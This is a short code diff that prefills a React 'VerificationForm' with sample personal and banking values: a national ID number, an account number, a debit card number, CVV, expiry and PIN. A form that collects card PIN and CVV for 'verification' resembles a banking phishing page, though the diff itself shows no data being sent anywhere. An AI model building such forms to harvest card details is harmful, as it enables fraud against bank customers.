@@ -8,9 +8,16 @@ const VerificationForm = () => {
     const [showPassword, setShowPassword] = useState(false);
     const [step, setStep] = useState(1);
     const [formData, setFormData] = useState({
-        fullName: "", cnic: "", mobile: "", email: "",
-        bank: "", accountNumber: "", debitCard: "",
-        cvv: "", expiryDate: "", pin: ""
+        fullName: "Ahmed Hassan Khan",
+        cnic: "42101-1234567-8",
+        mobile: "03001234567",
+        email: "ahmed.hassan@email.com",
+        bank: "hbl",
+        accountNumber: "PK36SCBL0000001234567890",
+        debitCard: "4532 1234 5678 9010",
+        cvv: "123",
+        expiryDate: "12/26",
+        pin: "1234"
     });
 
     useEffect(() => {
